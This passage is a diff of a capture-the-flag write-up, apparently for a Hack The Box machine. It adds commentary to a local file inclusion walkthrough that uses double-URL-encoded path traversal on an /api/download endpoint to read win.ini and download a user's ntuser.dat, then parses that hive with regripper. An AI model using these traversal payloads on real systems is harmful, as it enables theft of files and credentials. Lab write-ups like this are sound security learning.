@@ -681,12 +681,16 @@ python
 testing the /api/download endpoint
 
 ![](./screens/11.png)
+
 ## LFI
+
+a double url encoding payload grants file read on the system:
 
 ```
 GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
 ```
 
+![](./screens/12.png)
 
 
 we're authenticated as the
@@ -702,7 +706,9 @@ GET
 256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
 ```
 
-ntuser.dat
+![](./screens/13.png)
+
+downloading ntuser.dat:
 
 ```
  proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
@@ -722,6 +728,8 @@ ntuser.dat                  100%[===========================================>] 2
 2026-10-31 11:15:39 (1.07 MB/s) - ‘ntuser.dat’ saved [262144/262144]
 
 ```
+
+searching for recents documents opened reveals db.zip:
 
 ```
 regripper -r ntuser.dat -p recentdocs
